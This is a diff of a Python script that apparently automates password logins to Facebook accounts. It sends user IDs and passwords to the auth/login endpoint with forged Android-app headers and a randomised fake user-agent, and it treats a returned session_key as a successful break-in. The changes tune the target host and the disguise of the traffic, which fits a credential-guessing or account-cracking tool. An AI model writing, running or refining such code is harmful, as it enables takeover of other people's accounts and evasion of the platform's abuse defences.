@@ -1580,9 +1580,9 @@ def x(uid,pwx,tl):
             'fb_api_req_friendly_name': 'authenticate',
             'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers =  {
-            'host': 'b-graph.facebook.com',
+            'host': 'graph.facebook.com',
             'x-fb-connection-type': 'MOBILE.LTE',
-            'user-agent': us,
+            'user-agent':  f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
             'x-tigon-is-retry': 'False',
             'x-fb-device-group': str(random.randint(1000, 5999)),
             'x-graphql-request-purpose': 'fetch',
@@ -1598,7 +1598,7 @@ def x(uid,pwx,tl):
             'x-fb-http-engine': 'Tigon/Liger',
             'x-fb-client-ip': 'True',
             'x-fb-server-cluster': 'True',}
-            url = "https://b-graph.facebook.com/auth/login"
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -1636,6 +1636,7 @@ def x(uid,pwx,tl):
     except net_error:
         time.sleep(10)
     except Exception as e:
+        print(e)
         pass
 
 
